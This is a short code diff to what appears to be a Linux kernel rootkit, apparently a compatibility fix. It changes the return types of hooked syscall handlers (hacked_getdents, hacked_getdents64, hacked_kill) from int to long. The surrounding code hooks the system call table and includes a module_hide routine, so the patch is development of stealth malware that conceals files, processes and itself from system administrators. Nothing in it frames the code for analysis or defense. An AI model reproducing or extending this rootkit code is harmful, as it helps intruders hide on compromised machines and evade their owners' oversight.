@@ -46,11 +46,11 @@ static unsigned long *__sys_call_table;
 	static t_syscall orig_getdents64;
 	static t_syscall orig_kill;
 #else
-	typedef asmlinkage int (*orig_getdents_t)(unsigned int, struct linux_dirent *,
-		unsigned int);
-	typedef asmlinkage int (*orig_getdents64_t)(unsigned int,
+	typedef asmlinkage long (*orig_getdents_t)(unsigned int,
+            struct linux_dirent *, unsigned int);
+	typedef asmlinkage long (*orig_getdents64_t)(unsigned int,
 		struct linux_dirent64 *, unsigned int);
-	typedef asmlinkage int (*orig_kill_t)(pid_t, int);
+	typedef asmlinkage long (*orig_kill_t)(pid_t, int);
 	orig_getdents_t orig_getdents;
 	orig_getdents64_t orig_getdents64;
 	orig_kill_t orig_kill;
@@ -137,7 +137,7 @@ static asmlinkage long hacked_getdents64(const struct pt_regs *pt_regs) {
 #endif
 	int ret = orig_getdents64(pt_regs), err;
 #else
-asmlinkage int
+asmlinkage long
 hacked_getdents64(unsigned int fd, struct linux_dirent64 __user *dirent,
 	unsigned int count)
 {
@@ -204,7 +204,7 @@ static asmlinkage long hacked_getdents(const struct pt_regs *pt_regs) {
 #endif
 	int ret = orig_getdents(pt_regs), err;
 #else
-asmlinkage int
+asmlinkage long
 hacked_getdents(unsigned int fd, struct linux_dirent __user *dirent,
 	unsigned int count)
 {
@@ -316,7 +316,7 @@ module_hide(void)
 }
 
 #if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
-asmlinkage int
+asmlinkage long
 hacked_kill(const struct pt_regs *pt_regs)
 {
 #if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
@@ -327,7 +327,7 @@ hacked_kill(const struct pt_regs *pt_regs)
 	int sig = (int) pt_regs->regs[1];
 #endif
 #else
-asmlinkage int
+asmlinkage long
 hacked_kill(pid_t pid, int sig)
 {
 #endif
